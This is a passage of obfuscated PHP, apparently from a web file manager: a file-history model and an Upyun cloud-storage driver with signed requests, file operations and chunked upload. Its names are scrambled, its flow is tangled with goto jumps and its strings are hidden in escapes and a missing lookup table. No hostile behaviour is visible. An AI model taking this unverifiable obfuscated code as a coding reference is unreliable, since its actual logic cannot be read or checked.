$c´»¾ÔÆš[462]); Model($c´»¾ÔÆš[465])->remove($e‰Î¼¤ğ¸); } goto DÑÀ‚é; EéÍÄ‚œ×: $c´»¾ÔÆš =& $_SERVER[›èö’ù¤]; if (!$CÒÂî¶ÈÊº) { return !1; } if (!is_array($CÒÂî¶ÈÊº)) { $CÒÂî¶ÈÊº = array($CÒÂî¶ÈÊº); } goto bøµŒñ½á; cÇŒ²œ º: } public function setDetail($bö­ÅÊôÅ‡, $a Õ—øÈå¢) { $B®¹Ã—ÄÔ =& $_SERVER[›èö’ù¤]; return $this->where(array($B®¹Ã—ÄÔ[414] => $bö­ÅÊôÅ‡))->save(array($B®¹Ã—ÄÔ[1952] => $a Õ—øÈå¢)); } public function rollbackToItem($BÔÌĞÄ¬Œä, $bÑÖ¸Íéƒ¦) { goto bğ†‘ë …—; bğ†‘ë …—: $e˜‹á°ŠÅÒ =& $_SERVER[›èö’ù¤]; $F©¾Ş½ôÇÍ = Model($e˜‹á°ŠÅÒ[816])->sourceInfo($BÔÌĞÄ¬Œä); $this->addHistory($F©¾Ş½ôÇÍ, LNG($e˜‹á°ŠÅÒ[1963])); goto CéóÇÒÏôˆ; AÊ´¬œ„¦: return $this->where(array($e˜‹á°ŠÅÒ[414] => $bÑÖ¸Íéƒ¦))->delete(); goto bÛÙÁ°¿İ; CéóÇÒÏôˆ: $Bäª½³Áâ = $this->find($bÑÖ¸Íéƒ¦); $Dµ»™å£·ç = array($e˜‹á°ŠÅÒ[462] => $Bäª½³Áâ[$e˜‹á°ŠÅÒ[462]], $e˜‹á°ŠÅÒ[78] => $Bäª½³Áâ[$e˜‹á°ŠÅÒ[78]], $e˜‹á°ŠÅÒ[84] => time(), $e˜‹á°ŠÅÒ[449] => USER_ID); Model($e˜‹á°ŠÅÒ[816])->where(array($e˜‹á°ŠÅÒ[397] => $BÔÌĞÄ¬Œä))->save($Dµ»™å£·ç); goto AÊ´¬œ„¦; bÛÙÁ°¿İ: } public function clearSame($f›­‚Ì¨‹È) { goto C†­ğËºÛ; f™É£ÎÉ‚: $aµ ËöØ¶Ñ = array(); $F†ÛØĞóµ© = array(); foreach ($A™ŒŸñ–‹¯ as $c‚ƒéª½ÇÍ) { if (!$c‚ƒéª½ÇÍ || count($c‚ƒéª½ÇÍ) <= 1) { continue; } foreach ($c‚ƒéª½ÇÍ as $C·©ƒùØË) { $aµ ËöØ¶Ñ[] = $C·©ƒùØË[$EÜ…Õ¬Ş[462]]; $F†ÛØĞóµ©[] = $C·©ƒùØË[$EÜ…Õ¬Ş[395]]; } } goto Fà’ˆÇ……ë; C†­ğËºÛ: $EÜ…Õ¬Ş =& $_SERVER[›èö’ù¤]; $dÔ‚•¢Ìç = $this->listData($f›­‚Ì¨‹È); $A™ŒŸñ–‹¯ = array_to_keyvalue_group($dÔ‚•¢Ìç, $EÜ…Õ¬Ş[462]); goto f™É£ÎÉ‚; Fà’ˆÇ……ë: if (!$F†ÛØĞóµ©) { return; } $this->where(array($EÜ…Õ¬Ş[395] => array($EÜ…Õ¬Ş[7], $F†ÛØĞóµ©)))->delete(); Model($EÜ…Õ¬Ş[465])->remove($aµ ËöØ¶Ñ); goto Cğôº°°‰¦; Cğôº°°‰¦: } public function userSpace() { $BÉ–¡ãÌŞÔ =& $_SERVER[›èö’ù¤]; $A–îÆĞˆõ‰ = $this->tablePrefix; $f×‘àóÜ÷ = array($BÉ–¡ãÌŞÔ[1542] => USER_ID); $cæÜæÄˆŠ = "{$A–îÆĞˆõ‰}\x69\157\137\x66\151\154\145\40\146\x69\x6c\145\x73\40\x6f\156\x20\146\x69\154\145\163\56\x66\x69\154\x65\111\x44\40\75\x20\150\x69\163\164\x6f\x72\x79\x2e\146\x69\x6c\145\x49\104"; return $this->alias($BÉ–¡ãÌŞÔ[1961])->where($f×‘àóÜ÷)->join($cæÜæÄˆŠ, $BÉ–¡ãÌŞÔ[1962])->sum($BÉ–¡ãÌŞÔ[78]); } } goto eŠ¶ĞÇØº; fŒæ‚î¶±Î: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\x3a\57\57\x76\60\56\x61\160\151\x2e\x75\x70\171\165\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($C˜‰‘¨ˆ) { parent::__construct(); $this->_init($C˜‰‘¨ˆ); } public function _init($CÆŒƒ‡ÏÁ•) { $FÂô¡äÓ¬˜ =& $_SERVER[›èö’ù¤]; foreach ($CÆŒƒ‡ÏÁ• as $eŒ‚Ş—ŒÎº => $fÎŠôöÂİ) { if (isset($this->{$eŒ‚Ş—ŒÎº})) { $this->{$eŒ‚Ş—ŒÎº} = $fÎŠôöÂİ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FÂô¡äÓ¬˜[1353] . LNG($FÂô¡äÓ¬˜[1286])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($f¡ã¢ŠÂ’½, $EÃÎİæÆã‹ = "\107\x45\x54") { $B×Ğ‘¢Ó§ =& $_SERVER[›èö’ù¤]; $e¾„‡…øØ = gmdate($B×Ğ‘¢Ó§[1319]); $d‚¦Œ›˜ò“ = base64_encode(hash_hmac($B×Ğ‘¢Ó§[1354], "{$EÃÎİæÆã‹}\x26{$f¡ã¢ŠÂ’½}\x26{$e¾„‡…øØ}", md5("{$this->userpass}"), !0)); $bÓ¨²¸ãŸ„ = array("\x41\x75\164\150\157\x72\x69\x7a\x61\164\151\157\156\72\x55\x50\131\x55\116\x20{$this->username}\x3a{$d‚¦Œ›˜ò“}", "\104\x61\164\145\x3a{$e¾„‡…øØ}"); return $bÓ¨²¸ãŸ„; } public function ussRequest($DäˆÕ‘‡Â, $eİ‡Œ«ƒê = "\107\x45\124", $bó³©•±£à = false, $B’™ÔÜğ”ğ = false, $Dï‹‡âô’– = false) { goto f’±¿Â½‹è; CŠˆÏØò¤: if (!$AõŠ‹ÃÎ›) { return array($b¾ßƒœÄğª[1110] => !1, $b¾ßƒœÄğª[1112] => $b¾ßƒœÄğª[1355]); } if (strtolower($eİ‡Œ«ƒê) == $b¾ßƒœÄğª[190] || in_array($AõŠ‹ÃÎ›[$b¾ßƒœÄğª[1110]], array($b¾ßƒœÄğª[1213], $b¾ßƒœÄğª[1356]))) { $bó³©•±£à = $AõŠ‹ÃÎ›[$b¾ßƒœÄğª[1357]]; } else { $bó³©•±£à = json_decode($AõŠ‹ÃÎ›[$b¾ßƒœÄğª[1112]], !0); if (!$bó³©•±£à) { $bó³©•±£à = $AõŠ‹ÃÎ›[$b¾ßƒœÄğª[1112]]; } else { if (!$AõŠ‹ÃÎ›[$b¾ßƒœÄğª[734]] && isset($bó³©•±£à[$b¾ßƒœÄğª[1358]])) { $bó³©•±£à = $bó³©•±£à[$b¾ßƒœÄğª[1358]]; } } } return array($b¾ßƒœÄğª[1110] => $AõŠ‹ÃÎ›[$b¾ßƒœÄğª[734]], $b¾ßƒœÄğª[1112] => $bó³©•±£à); goto CÚŠÃœ®–Œ; Cµ™¤¢êƒ: $bé¾“¬Ğ¨à = $this->ussHeaders($cŸ¿…¿º½¢, $eİ‡Œ«ƒê); if ($B’™ÔÜğ”ğ) { $bé¾“¬Ğ¨à = array_merge($bé¾“¬Ğ¨à, $B’™ÔÜğ”ğ); } $AõŠ‹ÃÎ› = url_request($this->endpoint . $cŸ¿…¿º½¢, $eİ‡Œ«ƒê, $bó³©•±£à, $bé¾“¬Ğ¨à, $Dï‹‡âô’–); goto CŠˆÏØò¤; f’±¿Â½‹è: $b¾ßƒœÄğª =& $_SERVER[›èö’ù¤]; $DäˆÕ‘‡Â = trim($DäˆÕ‘‡Â, $b¾ßƒœÄğª[8]); $cŸ¿…¿º½¢ = "\57{$this->bucket}\57{$DäˆÕ‘‡Â}"; goto Cµ™¤¢êƒ; CÚŠÃœ®–Œ: } public function mkfile($eÑ³êŸ¶Ç¦, $FÔã¢£¬¹Ü = '', $bÅº¼°í·É = REPEAT_RENAME) { if ($this->setContent($eÑ³êŸ¶Ç¦, $FÔã¢£¬¹Ü)) { return $this->getPathOuter($eÑ³êŸ¶Ç¦); } return !1; } public function mkdir($EñŸä†‚Ÿ…, $eÇ¯…ï®ˆç = REPEAT_SKIP) { $B·‘ÑŒ²Û =& $_SERVER[›èö’ù¤]; $cÓõ¢’›¯Î = trim($EñŸä†‚Ÿ…, $B·‘ÑŒ²Û[8]); if ($this->_isFolder($cÓõ¢’›¯Î)) { return $this->getPathOuter($cÓõ¢’›¯Î); } $A¡´”Æ¶á… = array($B·‘ÑŒ²Û[1359]); $aá•²½³†Ü = $this->ussRequest($cÓõ¢’›¯Î, $B·‘ÑŒ²Û[224], !1, $A¡´”Æ¶á…); return $aá•²½³†Ü[$B·‘ÑŒ²Û[1110]] ? $this->getPathOuter($cÓõ¢’›¯Î) : !1; } public function copyFile($b©”„‘ “, $Fˆ—³»§â) { $e¢Ÿ²÷È =& $_SERVER[›èö’ù¤]; $e£ËË¾¨Ä = array($e¢Ÿ²÷È[1360] . "\57{$this->bucket}\57{$b©”„‘ “}", $e¢Ÿ²÷È[1361]); $A¨›ÊáËËÁ = $this->ussRequest($Fˆ—³»§â, $e¢Ÿ²÷È[226], !1, $e£ËË¾¨Ä); return $A¨›ÊáËËÁ[$e¢Ÿ²÷È[1110]] ? !0 : $this->getPathOuter($Fˆ—³»§â); } public function moveFile($A¢§æÄ´„, $fä«ŒïçñÃ) { $c²§ÚøŠŞ‘ =& $_SERVER[›èö’ù¤]; $DÁ“Ô¥İè¢ = array($c²§ÚøŠŞ‘[1362] . "\x2f{$this->bucket}\57{$A¢§æÄ´„}", $c²§ÚøŠŞ‘[1361]); $a¾àßÍò½ = $this->ussRequest($fä«ŒïçñÃ, $c²§ÚøŠŞ‘[226], !1, $DÁ“Ô¥İè¢); return $a¾àßÍò½[$c²§ÚøŠŞ‘[1110]] ? !0 : $this->getPathOuter($fä«ŒïçñÃ); } public function delFile($Fà¯ÄÖ™ˆ) { $dà¡Õù…‚º =& $_SERVER[›èö’ù¤]; $e³—„š« = $this->ussRequest($Fà¯ÄÖ™ˆ, $dà¡Õù…‚º[1363]); return $e³—„š«[$dà¡Õù…‚º[1110]] ? !0 : !1; } public function delFolder($bö…¦¸º¿Ë) { goto Eˆ…ãÓŸ—Ÿ; Fæó‚‹øæ : foreach ($BÊ¶‚Â¤¿ as $cÃÀ®ôò®¬) { $fˆƒÁÛÖµ = $this->ussRequest($cÃÀ®ôò®¬[$F›¶á¾£Ò¨[28]], $F›¶á¾£Ò¨[1363]); if (!$fˆƒÁÛÖµ[$F›¶á¾£Ò¨[1110]]) { return !1; } } foreach ($d‡Ææ„ğáÊ as $AÁË‰„¿À) { $fˆƒÁÛÖµ = $this->ussRequest($AÁË‰„¿À, $F›¶á¾£Ò¨[1363]); if (!$fˆƒÁÛÖµ[$F›¶á¾£Ò¨[1110]]) { return !1; } } $fˆƒÁÛÖµ = $this->ussRequest($bö…¦¸º¿Ë, $F›¶á¾£Ò¨[1363]); goto d´ŒµÀôé; Eˆ…ãÓŸ—Ÿ: $F›¶á¾£Ò¨ =& $_SERVER[›èö’ù¤]; if (!$this->exist($bö…¦¸º¿Ë)) { return !0; } $this->listItemCache = !1; goto B®ÒŠˆ»¨·; d´ŒµÀôé: return $fˆƒÁÛÖµ[$F›¶á¾£Ò¨[1110]]; goto AË± ¨ŠÀÛ; B®ÒŠˆ»¨·: $d‡Ææ„ğáÊ = $BÊ¶‚Â¤¿ = array(); $this->fileList($bö…¦¸º¿Ë, $d‡Ææ„ğáÊ, $BÊ¶‚Â¤¿, !0); $this->listItemCache = !0; goto Fæó‚‹øæ ; AË± ¨ŠÀÛ: } public function rename($B»‰²óòà, $eÅ¢õ¡çñ) { if ($this->isFile($B»‰²óòà)) { $eÅ¢õ¡çñ = get_path_father($B»‰²óòà) . $eÅ¢õ¡çñ; return $this->moveFile($B»‰²óòà, $eÅ¢õ¡çñ); } return $this->renameObject($B»‰²óòà, $eÅ¢õ¡çñ); } public function fileInfo($AîåŒì™ˆ¸, $fÆ„µÊõÚÙ = false, $C†´³Šªò = array()) { goto DÁ‘Î‰è›Š; c±âœ î‘¼: $Eæ¾åàœ¹‰[$D®–‰š½Ï[194]] = $Eæ¾åàœ¹‰[$D®–‰š½Ï[84]] = 0; $Eæ¾åàœ¹‰[$D®–‰š½Ï[195]] = $Eæ¾åàœ¹‰[$D®–‰š½Ï[196]] = !0; if (empty($C†´³Šªò)) { $C†´³Šªò = $this->objectMeta($AîåŒì™ˆ¸); if (!$C†´³Šªò) { return $Eæ¾åàœ¹‰; } } goto DÏëÕé®º; DÁ‘Î‰è›Š: $D®–‰š½Ï =& $_SERVER[›èö’ù¤]; $Eæ¾åàœ¹‰ = array($D®–‰š½Ï[28] => $this->pathThis($AîåŒì™ˆ¸), $D®–‰š½Ï[76] => $this->getPathOuter($D®–‰š½Ï[8] . $AîåŒì™ˆ¸), $D®–‰š½Ï[29] => $D®–‰š½Ï[193], $D®–‰š½Ï[78] => isset($C†´³Šªò[$D®–‰š½Ï[78]]) ? $C†´³Šªò[$D®–‰š½Ï[78]] : 0, $D®–‰š½Ï[168] => $this->ext($AîåŒì™ˆ¸)); if ($fÆ„µÊõÚÙ) { return $Eæ¾åàœ¹‰; } goto c±âœ î‘¼; DÏëÕé®º: $Eæ¾åàœ¹‰[$D®–‰š½Ï[194]] = intval($C†´³Šªò[$D®–‰š½Ï[1364]]); $Eæ¾åàœ¹‰[$D®–‰š½Ï[84]] = intval($C†´³Šªò[$D®–‰š½Ï[1365]]); $Eæ¾åàœ¹‰[$D®–‰š½Ï[78]] = $C†´³Šªò[$D®–‰š½Ï[78]]; goto F®Ÿ´ì³¸‘; F®Ÿ´ì³¸‘: return $Eæ¾åàœ¹‰; goto BÌË×¿Êº; BÌË×¿Êº: } public function folderInfo($e¢êºÊ˜ù®, $c‰ô‰ÄÀÉ = false) { goto aŒÏÇ¡Æ‰; B¤É÷¹¸İª: $c†îø„…[$F” †…áçÄ[194]] = $c†îø„…[$F” †…áçÄ[84]] = 0; $c†îø„…[$F” †…áçÄ[195]] = $c†îø„…[$F” †…áçÄ[196]] = !0; if (empty($E¨Ò¤ëÜ¢µ)) { $E¨Ò¤ëÜ¢µ = $this->objectMeta($e¢êºÊ˜ù®); if (!$E¨Ò¤ëÜ¢µ) { return $c†îø„…; } } goto EìíÔæŞ¹Ù; aŒÏÇ¡Æ‰: $F” †…áçÄ =& $_SERVER[›èö’ù¤]; $c†îø„… = array($F” †…áçÄ[28] => $this->pathThis($e¢êºÊ˜ù®), $F” †…áçÄ[76] => $this->getPathOuter($F” †…áçÄ[8] . $e¢êºÊ˜ù®), $F” †…áçÄ[29] => $F” †…áçÄ[77]); if ($c‰ô‰ÄÀÉ) { return $c†îø„…; } goto B¤É÷¹¸İª; EìíÔæŞ¹Ù: $c†îø„…[$F” †…áçÄ[194]] = intval($E¨Ò¤ëÜ¢µ[$F” †…áçÄ[1364]]); $c†îø„…[$F” †…áçÄ[84]] = intval($E¨Ò¤ëÜ¢µ[$F” †…áçÄ[1365]]); return $c†îø„…; goto CÍ£Ú©“Æ; CÍ£Ú©“Æ: } private function listObjs($a³åœäÅ§Â, $b˜…âÑİè° = 0, $E´„‹òÓŞƒ = 1000) { $DˆŸèÀãÁ =& $_SERVER[›èö’ù¤]; $dÑ…Ó«âÄÀ = array($DˆŸèÀãÁ[1366], $DˆŸèÀãÁ[1367] . $E´„‹òÓŞƒ); if ($b˜…âÑİè°) { $dÑ…Ó«âÄÀ[] = $DˆŸèÀãÁ[1368] . $b˜…âÑİè°; } $A²ìÏ¥Ôöª = $this->ussRequest($a³åœäÅ§Â, $DˆŸèÀãÁ[228], !1, $dÑ…Ó«âÄÀ); return !$A²ìÏ¥Ôöª[$DˆŸèÀãÁ[1110]] ? !1 : $A²ìÏ¥Ôöª[$DˆŸèÀãÁ[1112]]; } private function fileList($b”‘ğóÂ”, &$c¼¾õö™æÛ, &$Añ¬À³òÙ, $B¥†òèõ³ = false) { goto cÛíŠ‰Ú; dÙƒò‰‡´: $d†é¡ÑöŠ¼ = rtrim($b”‘ğóÂ”, $Eåµ¥ƒ [8]) . $Eåµ¥ƒ [8]; $fƒ¾™½Â—¯ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Bôö‘ØŠÈ = $this->listObjs($b”‘ğóÂ”, $A•ÆëİÄÒƒ, $fßíÏ˜½´Í); if (!$Bôö‘ØŠÈ) { return !1; } $A•ÆëİÄÒƒ = isset($Bôö‘ØŠÈ[$Eåµ¥ƒ [1369]]) ? $Bôö‘ØŠÈ[$Eåµ¥ƒ [1369]] : $Eåµ¥ƒ [33]; $BÕš‚¦ò° = isset($Bôö‘ØŠÈ[$Eåµ¥ƒ [1370]]) ? $Bôö‘ØŠÈ[$Eåµ¥ƒ [1370]] : array(); foreach ($BÕš‚¦ò° as $Cì°Ç ‡³) { $fÔÆåì¤‡ = $Cì°Ç ‡³[$Eåµ¥ƒ [29]] == $Eåµ¥ƒ [77] ? !0 : !1; $ešÄÚòŞË = ltrim($d†é¡ÑöŠ¼ . $Cì°Ç ‡³[$Eåµ¥ƒ [28]], $Eåµ¥ƒ [8]) . ($fÔÆåì¤‡ ? $Eåµ¥ƒ [8] : $Eåµ¥ƒ [33]); $C¾¡­·×Æ = array($Eåµ¥ƒ [28] => $ešÄÚòŞË, $Eåµ¥ƒ [29] => $fÔÆåì¤‡ ? $Eåµ¥ƒ [77] : $Eåµ¥ƒ [193], $Eåµ¥ƒ [78] => $Cì°Ç ‡³[$Eåµ¥ƒ [335]], $Eåµ¥ƒ [1365] => $Cì°Ç ‡³[$Eåµ¥ƒ [1371]]); if ($fƒ¾™½Â—¯) { $this->cacheMethod($Eåµ¥ƒ [199], $ešÄÚòŞË, $fÔÆåì¤‡); $this->cacheMethod($Eåµ¥ƒ [200], $ešÄÚòŞË, $C¾¡­·×Æ); } if ($fÔÆåì¤‡) { $c¼¾õö™æÛ[] = $ešÄÚòŞË; if ($B¥†òèõ³) { $this->fileList($ešÄÚòŞË, $c¼¾õö™æÛ, $Añ¬À³òÙ, $B¥†òèõ³); } continue; } $Añ¬À³òÙ[] = $C¾¡­·×Æ; } if (count($BÕš‚¦ò°) < $fßíÏ˜½´Í) { break; } } goto e‰ßÈÂöš; e‰ßÈÂöš: if ($fƒ¾™½Â—¯) { $this->cacheMethod($Eåµ¥ƒ [199], $b”‘ğóÂ”, !0); } goto cëØ´öí‘£; cÛíŠ‰Ú: $Eåµ¥ƒ  =& $_SERVER[›èö’ù¤]; $A•ÆëİÄÒƒ = $Eåµ¥ƒ [33]; $fßíÏ˜½´Í = 1000; goto dÙƒò‰‡´; cëØ´öí‘£: } public function listPath($d¡…Ê¡¡ , $Eò˜–ñÜ¶Ì = false) { $f¨ã•Ú‘å =& $_SERVER[›èö’ù¤]; $DÚˆ‹Ë† = $BãˆœîÆİæ = array(); $this->fileList($d¡…Ê¡¡ , $DÚˆ‹Ë†, $BãˆœîÆİæ); foreach ($DÚˆ‹Ë† as $EªøíÈêÈ => $a»ÏÏåãÌ¹) { $DÚˆ‹Ë†[$EªøíÈêÈ] = $this->folderInfo($a»ÏÏåãÌ¹, $Eò˜–ñÜ¶Ì); } foreach ($BãˆœîÆİæ as $EªøíÈêÈ => $a»ÏÏåãÌ¹) { $BãˆœîÆİæ[$EªøíÈêÈ] = $this->fileInfo($a»ÏÏåãÌ¹[$f¨ã•Ú‘å[28]], $Eò˜–ñÜ¶Ì, $a»ÏÏåãÌ¹); } return array($f¨ã•Ú‘å[75] => $DÚˆ‹Ë†, $f¨ã•Ú‘å[74] => $BãˆœîÆİæ); } public function has($b•ôîÁÔİ†, $fñİïğ±¨÷ = false, $f¾İ¢Û¤Å­ = true) { goto fÖÄ…É®Ôí; A—”–…Ùğ…: $Fâ·›øõÎƒ = 0; $C¬Ú×ëò = 0; $C¶ˆì›Åë¼ = rtrim($b•ôîÁÔİ†, $F£ïëà¬Òâ[8]) . $F£ïëà¬Òâ[8]; goto b¸Ä´ò¹—Ü; fÖÄ…É®Ôí: $F£ïëà¬Òâ =& $_SERVER[›èö’ù¤]; $Dï¼É—è‹Â = $F£ïëà¬Òâ[33]; $bÆãØ™£á‹ = 500; goto A—”–…Ùğ…; b¸Ä´ò¹—Ü: while (!0) { check_abort(); $b¹çÇ˜ÄÂ = $this->listObjs($b•ôîÁÔİ†, $Dï¼É—è‹Â, $bÆãØ™£á‹); if (!$b¹çÇ˜ÄÂ) { return !1; } $Dï¼É—è‹Â = isset($b¹çÇ˜ÄÂ[$F£ïëà¬Òâ[1369]]) ? $b¹çÇ˜ÄÂ[$F£ïëà¬Òâ[1369]] : $F£ïëà¬Òâ[33]; $DõŠéÚ—ï„ = isset($b¹çÇ˜ÄÂ[$F£ïëà¬Òâ[1370]]) ? $b¹çÇ˜ÄÂ[$F£ïëà¬Òâ[1370]] : array(); if (empty($DõŠéÚ—ï„)) { break; } $E“Ì¦‘â‹° = array_filter($DõŠéÚ—ï„, function ($dÇØóâ¬Ì) { $A¯“ãò¥Š =& $_SERVER[›èö’ù¤]; return $dÇØóâ¬Ì[$A¯“ãò¥Š[29]] == $A¯“ãò¥Š[77]; }); $e¨ìæß„ÑÓ = count($DõŠéÚ—ï„); $E“Ì¦‘â‹° = count($E“Ì¦‘â‹°); $fàŒôØ¬òó = $e¨ìæß„ÑÓ - $E“Ì¦‘â‹°; if ($fñİïğ±¨÷) { $C¬Ú×ëò += $E“Ì¦‘â‹°; $Fâ·›øõÎƒ += $fàŒôØ¬òó; if ($e¨ìæß„ÑÓ < $bÆãØ™£á‹) { break; } continue; } if ($f¾İ¢Û¤Å­) { if ($fàŒôØ¬òó) { return !0; } } else { if ($E“Ì¦‘â‹°) { return !0; } } if ($e¨ìæß„ÑÓ < $bÆãØ™£á‹) { break; } } if ($fñİïğ±¨÷) { return array($F£ïëà¬Òâ[203] => $Fâ·›øõÎƒ, $F£ïëà¬Òâ[204] => $C¬Ú×ëò); } return !1; goto F×¿ø³Œ–ç; F×¿ø³Œ–ç: } public function listAll($e¡ÀÈöôÓ) { goto E¯©îÄÑ·; fÀÀƒáö‰Û: $e¹øÏÇ› = array(); foreach ($d•Ê¨„Û‡Ş as $cÎÛ ÷‚ø±) { $e¹øÏÇ›[$cÎÛ ÷‚ø±[$Bœˆ¾‡ğ«š[28]]] = $cÎÛ ÷‚ø±[$Bœˆ¾‡ğ«š[78]]; } foreach ($F©µì£ƒîÇ as $cÎÛ ÷‚ø±) { if (is_string($cÎÛ ÷‚ø±)) { $e¹øÏÇ›[$cÎÛ ÷‚ø±] = 0; } } goto AğŸ±–—É˜; AğŸ±–—É˜: return $this->listAllFiles($e¡ÀÈöôÓ, array_keys($e¹øÏÇ›), $e¹øÏÇ›); goto eáßØô…©; E¯©îÄÑ·: $Bœˆ¾‡ğ«š =& $_SERVER[›èö’ù¤]; $F©µì£ƒîÇ = $d•Ê¨„Û‡Ş = array(); $this->fileList($e¡ÀÈöôÓ, $F©µì£ƒîÇ, $d•Ê¨„Û‡Ş, !0); goto fÀÀƒáö‰Û; eáßØô…©: } public function canRead($dæî¦¶±Ã“) { return $this->exist($dæî¦¶±Ã“) ? !0 : !1; } public function canWrite($dºÕµóŞˆÖ) { return $this->exist($dºÕµóŞˆÖ) ? !0 : !1; } public function getContent($CîÁö¨åîô) { return $this->fileSubstr($CîÁö¨åîô, 0, -1); } public function setContent($fïàø’…Íó, $BÍ­îªÇ§Š = '') { $AÌ†ˆ”§©œ =& $_SERVER[›èö’ù¤]; if (!$BÍ­îªÇ§Š) { $AÄ©áõŒã™ = $this->ussRequest($fïàø’…Íó, $AÌ†ˆ”§©œ[224]); return $AÄ©áõŒã™[$AÌ†ˆ”§©œ[1110]]; } $DÊ…šâº‰å = $this->tempFile($this->pathThis($fïàø’…Íó)); file_put_contents($DÊ…šâº‰å, $BÍ­îªÇ§Š); if ($this->upload($fïàø’…Íó, $DÊ…šâº‰å)) { $this->tempFileRemve($DÊ…šâº‰å); return !0; } return !1; } public function fileSubstr($Aİ£®Úõ¥, $c£Ù¢¨­¢è, $d´ÁÄÈî‹) { $E„ÁÍ÷Çß¤ =& $_SERVER[›èö’ù¤]; if (!($E †ˆáÙé¶ = $this->link($Aİ£®Úõ¥))) { return !1; } $cÂÜ÷Ïä‡ = !1; if ($d´ÁÄÈî‹ > 0) { $Déˆ¬êõ– = $c£Ù¢¨­¢è + $d´ÁÄÈî‹ - 1; $cÂÜ÷Ïä‡ = array($E„ÁÍ÷Çß¤[1332] . $c£Ù¢¨­¢è . $E„ÁÍ÷Çß¤[455] . $Déˆ¬êõ–); } $bÜöØïâÊ” = url_request($E †ˆáÙé¶, $E„ÁÍ÷Çß¤[228], !1, $cÂÜ÷Ïä‡); return $bÜöØïâÊ”[$E„ÁÍ÷Çß¤[734]] ? $bÜöØïâÊ”[$E„ÁÍ÷Çß¤[1112]] : !1; } public function upload($B¶–åËé, $C£“¬¬È¦º, $bØŠİ¥†…ë = false, $fƒÊöçºŒ = REPEAT_REPLACE) { goto CİğÖ¬¶ªÀ; Eñæ½Ìä®õ: $b÷ƒğö• = $this->ussRequest($B¶–åËé, $B¤™ÉŠîŸØ[226], !1, $Fø ‰ò¤ŞÙ); return $b÷ƒğö•[$B¤™ÉŠîŸØ[1110]] ? $this->getPathOuter($aŸ·¹£‚ßá) : !1; goto b™É¶ÒêÛ™; e…¬µˆ–å³: if (!$b÷ƒğö•[$B¤™ÉŠîŸØ[1110]]) { return !1; } $B¯ö¼›å¦£ = $b÷ƒğö•[$B¤™ÉŠîŸØ[1112]]; $bÄ§‡Øéö = 0; goto bêÉÇÛ¥Ò; bêÉÇÛ¥Ò: $Fì‰ÓĞ¦ØŠ = $B¯ö¼›å¦£[$B¤™ÉŠîŸØ[1377]]; $D†¤ùªë´¹ = fopen($C£“¬¬È¦º, $B¤™ÉŠîŸØ[1283]); if (!$D†¤ùªë´¹) { return !1; } goto AñìôÜ¡òå; CİğÖ¬¶ªÀ: $B¤™ÉŠîŸØ =& $_SERVER[›èö’ù¤]; $a„‚÷¢Á¸Ó = IO::size($C£“¬¬È¦º); if ($a„‚÷¢Á¸Ó <= 1024 * 1024 * 200) { $cí‡½ñ«‹ø = array($B¤™ÉŠîŸØ[1372] . $C£“¬¬È¦º); $b÷ƒğö• = $this->ussRequest($B¶–åËé, $B¤™ÉŠîŸØ[226], $cí‡½ñ«‹ø); return $b÷ƒğö•[$B¤™ÉŠîŸØ[1110]] ? $this->getPathOuter($B¶–åËé) : !1; } goto f Ÿß÷™µ; AñìôÜ¡òå: do { $BÓº«Ö¥Œ‡ = $B¯ö¼›å¦£[$B¤™ÉŠîŸØ[1378]]; fseek_64($D†¤ùªë´¹, $bÄ§‡Øéö); $D¯Â­ø¬È³ = fread($D†¤ùªë´¹, $BÓº«Ö¥Œ‡); $C‡³Ãğİø  = 0; do { $C‡³Ãğİø ++; $B¯ö¼›å¦£ = $this->uploadPart($B¶–åËé, $B¯ö¼›å¦£, $D¯Â­ø¬È³); } while (!$B¯ö¼›å¦£ && $C‡³Ãğİø  < 3); if (!$B¯ö¼›å¦£) { return !1; } $Fì‰ÓĞ¦ØŠ = $B¯ö¼›å¦£[$B¤™ÉŠîŸØ[1377]]; $bÄ§‡Øéö += $BÓº«Ö¥Œ‡; } while ($Fì‰ÓĞ¦ØŠ != -1); fclose($D†¤ùªë´¹); $Fø ‰ò¤ŞÙ = array($B¤™ÉŠîŸØ[1379], $B¤™ÉŠîŸØ[1380] . $B¯ö¼›å¦£[$B¤™ÉŠîŸØ[1381]], $B¤™ÉŠîŸØ[1375]); goto Eñæ½Ìä®õ; f Ÿß÷™µ: $b©”°İÕ· = 1024 * 1024 * 10; $Fø ‰ò¤ŞÙ = array($B¤™ÉŠîŸØ[1373], $B¤™ÉŠîŸØ[1374] . $a„‚÷¢Á¸Ó, $B¤™ÉŠîŸØ[1375], $B¤™ÉŠîŸØ[1376] . $b©”°İÕ·); $b÷ƒğö• = $this->ussRequest($B¶–åËé, $B¤™ÉŠîŸØ[226], !1, $Fø ‰ò¤ŞÙ); goto e…¬µˆ–å³; b™É¶ÒêÛ™: } private function uploadPart($fÄí”äœø¬, $fØ¢Øôé¤», &$bâ–×Ç­«‚) { $C³ÚÛŠŠ…‹ =& $_SERVER[›èö’ù¤]; $B×¹ªîÆ– = array($C³ÚÛŠŠ…‹[1382], $C³ÚÛŠŠ…‹[1380] . $fØ¢Øôé¤»[$C³ÚÛŠŠ…‹[1381]], $C³ÚÛŠŠ…‹[1383] . $fØ¢Øôé¤»[$C³ÚÛŠŠ…‹[1377]], $C³ÚÛŠŠ…‹[141] . $fØ¢Øôé¤»[$C³ÚÛŠŠ…‹[1378]]); $f©ù£Ïìâ° = $this->ussRequest($fÄí”äœø¬, $C³ÚÛŠŠ…‹[226], $bâ–×Ç­«‚, $B×¹ªîÆ–); return !$f©ù£Ïìâ°[$C³ÚÛŠŠ…‹[1110]] ? $f©ù£Ïìâ°[$C³ÚÛŠŠ…‹[1110]] : $f©ù£Ïìâ°[$C³ÚÛŠŠ…‹[1112]]; } public function uploadFormData($EÑ±À¯¹Ô, $c¬Ø‚Í™ÊÈ = 3600) { return $this->uploadPolicy($EÑ±À¯¹Ô, $c¬Ø‚Í™ÊÈ); } public function multiUploadFormData($cöì³Æ¡Ùç, $aæÊÏ™Œ© = 3600) { $aã´Ğ§Üô =& $_SERVER[›èö’ù¤]; $DØİßˆôôç = (int) 